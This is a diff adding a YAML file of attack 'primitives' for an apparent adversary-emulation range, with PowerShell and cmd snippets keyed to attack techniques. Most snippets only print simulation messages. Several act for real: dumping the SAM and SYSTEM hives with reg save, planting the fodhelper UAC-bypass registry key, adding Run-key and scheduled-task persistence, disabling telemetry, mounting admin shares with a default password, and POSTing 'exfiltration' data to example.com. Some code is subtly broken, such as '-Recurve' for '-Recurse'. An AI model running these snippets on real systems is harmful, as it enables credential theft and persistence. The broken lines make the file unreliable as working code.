@@ -1,0 +1,466 @@
+---
+
+# vars/primitives.yml
+
+primitives:
+
+
+  exec_powershell:
+
+    variants:
+
+      - name: inline
+
+        script: |
+
+          powershell.exe -NoProfile -Command "Get-Service | Select-Object -First 5"
+
+      - name: encoded
+
+        script: |
+
+          $cmd = "Get-Process | Select-Object -First 3"
+
+          $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+
+          Start-Process powershell.exe -ArgumentList "-NoProfile", "-EncodedCommand", $enc
+
+
+  exec_cmd:
+
+    variants:
+
+      - name: environmental_recon
+
+        script: |
+
+          cmd.exe /c "set && whoami /all"
+
+
+  exec_shell:
+
+    variants:
+
+      - name: generic_spawn
+
+        script: |
+
+          Write-Output "[Telemetry] Simulating general command shell fallback invocation"
+
+          whoami
+
+
+  exec_vbscript:
+
+    variants:
+
+      - name: wscript_echo
+
+        script: |
+
+          $vbsPath = "C:\ProgramData\RangeEngine\Queue\telemetry_test.vbs"
+
+          "WScript.Echo `"Simulating VBScript Execution telemetry footprint`"" | Out-File $vbsPath -Encoding ascii
+
+          cmd.exe /c "cscript.exe //NoLogo $vbsPath"
+
+          if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force }
+
+
+  native_api:
+
+    variants:
+
+      - name: process_call_trace
+
+        script: |
+
+          Write-Output "[Telemetry] Simulating Win32 API direct execution path (NtCreateUserProcess/CreateProcessW)"
+
+          [System.Diagnostics.Process]::Start("cmd.exe", "/c echo Telemetry Trace")
+
+
+  service_execution:
+
+    variants:
+
+      - name: service_create_sim
+
+        script: |
+
+          sc.exe create RangeEngine_Telemetry binPath= "C:\Windows\System32\cmd.exe /c echo beacon" start= demand
+
+          sc.exe delete RangeEngine_Telemetry
+
+
+  scheduled_task:
+
+    variants:
+
+      - name: persistent_job
+
+        script: |
+
+          schtasks.exe /create /tn "RangeEngine_Update" /tr "cmd.exe /c echo 'beacon'" /sc daily /st 12:00 /f
+
+      - name: execution_cleanup
+
+        script: |
+
+          schtasks.exe /delete /tn "RangeEngine_Update" /f -ErrorAction SilentlyContinue
+
+
+  autorun_registry:
+
+    variants:
+
+      - name: user_run_key
+
+        script: |
+
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "EngineUpdate" -Value "C:\Windows\System32\cmd.exe /c" -PropertyType String -Force
+
+
+  registry_modification:
+
+    variants:
+
+      - name: telemetry_optout_mod
+
+        script: |
+
+          $RegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection"
+
+          if (-not (Test-Path $RegPath)) { New-Item -Path $RegPath -Force | Out-Null }
+
+          New-ItemProperty -Path $RegPath -Name "AllowTelemetry" -Value 0 -PropertyType DWord -Force | Out-Null
+
+
+  uac_bypass:
+
+    variants:
+
+      - name: fodhelper_mock
+
+        script: |
+
+          Write-Output "[Telemetry Simulation] Simulating classic UAC bypass registry modification on fodhelper target context."
+
+          $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+
+          if (-not (Test-Path $RegPath)) { New-Item -Path $RegPath -Force | Out-Null }
+
+          New-ItemProperty -Path $RegPath -Name "" -Value "cmd.exe /c whoami" -PropertyType String -Force | Out-Null
+
+          New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
+
+          # Structural cleanup to maintain target sanitation bounds
+
+          Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurve -Force -ErrorAction SilentlyContinue
+
+
+  process_injection:
+
+    variants:
+
+      - name: virtual_alloc_mock
+
+        script: |
+
+          Write-Output "[Telemetry Simulation] Simulating remote thread creation mapping characteristics into target memory spaces."
+
+          Get-Process -Name notepad -ErrorAction SilentlyContinue | Select-Object -First 1
+
+
+  host_discovery:
+
+    variants:
+
+      - name: quick_sys_audit
+
+        script: |
+
+          hostname
+
+          systeminfo | Select-String "OS Name", "System Boot Time" -Context 0,1
+
+      - name: active_user_recon
+
+        script: |
+
+          query user
+
+          net user
+
+
+  process_discovery:
+
+    variants:
+
+      - name: process_list_wmic
+
+        script: |
+
+          wmic process get name,processid,executablepath
+
+      - name: process_list_gps
+
+        script: |
+
+          Get-Process | Select-Object Name, Id, Path -First 30
+
+
+  file_discovery:
+
+    variants:
+
+      - name: locate_sensitive_files
+
+        script: |
+
+          Get-ChildItem -Path 'C:\Users' -Include "*.docx", "*.xlsx", "*.pdf" -Recurve -ErrorAction SilentlyContinue | Select-Object FullName -First 15
+
+
+  network_discovery:
+
+    variants:
+
+      - name: connection_mapping
+
+        script: |
+
+          netstat -ano
+
+          ipconfig /all
+
+          route print
+
+      - name: net_view_enumeration
+
+        script: |
+
+          net view /all
+
+          net localgroup administrators
+
+
+  account_discovery:
+
+    variants:
+
+      - name: domain_user_enum
+
+        script: |
+
+          net user /domain -ErrorAction SilentlyContinue
+
+          net group "Domain Admins" /domain -ErrorAction SilentlyContinue
+
+
+  credential_access:
+
+    variants:
+
+      - name: vault_credential_dump
+
+        script: |
+
+          Write-Output "[Telemetry Simulation] Enumerating application credential storage vaults."
+
+          [Windows.Security.Credentials.CredentialVault, Windows.Security.Credentials, ContentType=WindowsRuntime] | Out-Null
+
+
+  browser_credential_access:
+
+    variants:
+
+      - name: login_data_locate
+
+        script: |
+
+          Write-Output "[Telemetry Simulation] Simulating baseline browser storage file discovery lookups."
+
+          Get-ChildItem -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data" -Filter "Login Data" -Recurve -ErrorAction SilentlyContinue
+
+
+  lsass_access:
+
+    variants:
+
+      - name: comsvcs_minidump
+
+        script: |
+
+          Write-Output "[Telemetry Simulation] Simulating Rundll32 comsvcs.dll, MiniDump memory read signatures."
+
+          Get-Process -Name lsass | Select-Object Id
+
+
+  sam_access:
+
+    variants:
+
+      - name: reg_save_sam
+
+        script: |
+
+          if (-not (Test-Path "C:\ProgramData\RangeEngine\Staging")) { New-Item -Path "C:\ProgramData\RangeEngine\Staging" -ItemType Directory -Force }
+
+          reg.exe save HKLM\SAM C:\ProgramData\RangeEngine\Staging\sam.bak /y
+
+          reg.exe save HKLM\SYSTEM C:\ProgramData\RangeEngine\Staging\sys.bak /y
+
+
+  password_attack:
+
+    variants:
+
+      - name: local_brute_force_mock
+
+        script: |
+
+          Write-Output "[Telemetry Simulation] Emulating localized high-frequency authentication processing patterns."
+
+
+  kerberos_interaction:
+
+    variants:
+
+      - name: ticket_use_klist
+
+        script: |
+
+          klist
+
+
+  lateral_rdp:
+
+    variants:
+
+      - name: rdp_mstsc_init
+
+        script: |
+
+          if (-not $TARGETS) { $TARGETS = @("127.0.0.1") }
+
+          $target = $TARGETS | Get-Random
+
+          Write-Output "Simulating incoming lateral network pathing interface to host: $target"
+
+          cmd.exe /c "echo mstsc.exe /v:$target"
+
+
+  lateral_smb:
+
+    variants:
+
+      - name: admin_share_access
+
+        script: |
+
+          if (-not $TARGETS) { $TARGETS = @("127.0.0.1") }
+
+          if (-not $USER) { $USER = "Administrator" }
+
+          if (-not $PASS) { $PASS = "Password123" }
+
+          $target = $TARGETS | Get-Random
+
+          
+
+          net use \\$target\C$ /user:$USER "$PASS" -ErrorAction SilentlyContinue
+
+          dir \\$target\C$ > $null -ErrorAction SilentlyContinue
+
+          net use \\$target\C$ /delete -ErrorAction SilentlyContinue
+
+
+  lateral_wmi:
+
+    variants:
+
+      - name: remote_exec_cim
+
+        script: |
+
+          if (-not $TARGETS) { $TARGETS = @("127.0.0.1") }
+
+          $target = $TARGETS | Get-Random
+
+          Write-Output "Spooling WMI creation execution trace via CIM channel on $target"
+
+          cmd.exe /c "echo Invoke-CimMethod -ComputerName $target -ClassName Win32_Process -MethodName Create"
+
+
+  data_collection:
+
+    variants:
+
+      - name: dynamic_doc_gather
+
+        script: |
+
+          Write-Output "[Telemetry] Locating specific centralized file collection paths."
+
+
+  stage_data:
+
+    variants:
+
+      - name: zip_archive
+
+        script: |
+
+          if (-not (Test-Path "C:\ProgramData\RangeEngine\Staging")) { New-Item -Path "C:\ProgramData\RangeEngine\Staging" -ItemType Directory -Force }
+
+          Get-Service | Select-Object -First 20 | Out-File "C:\ProgramData\RangeEngine\Staging\services.txt"
+
+          Compress-Archive -Path "C:\ProgramData\RangeEngine\Staging\*" -DestinationPath "C:\ProgramData\RangeEngine\staged_data.zip" -Force
+
+
+  exfiltration:
+
+    variants:
+
+      - name: outbound_http_post
+
+        script: |
+
+          Invoke-WebRequest -Uri "http://example.com" -Method Post -Body "Simulation Exfiltration Stream Content Data" -UseBasicParsing > $null
+
+
+  obfuscation:
+
+    variants:
+
+      - name: b64_layering
+
+        script: |
+
+          Write-Output "[Telemetry] Simulating script layout encoding layers."
+
+
+  masquerading:
+
+    variants:
+
+      - name: system_binary_rename
+
+        script: |
+
+          Write-Output "[Telemetry] Emulating trusted dual-use proxy executable execution metadata configurations."
+
+
+  cleanup:
+
+    variants:
+
+      - name: engine_purge
+
+        script: |
+
+          Write-Output "Executing localized range cleanup primitives..."
+
+          if (Test-Path "C:\ProgramData\RangeEngine\Staging") { Remove-Item -Path "C:\ProgramData\RangeEngine\Staging" -Recurve -Force }
+
+          if (Test-Path "C:\ProgramData\RangeEngine\staged_data.zip") { Remove-Item -Path "C:\ProgramData\RangeEngine\staged_data.zip" -Force }
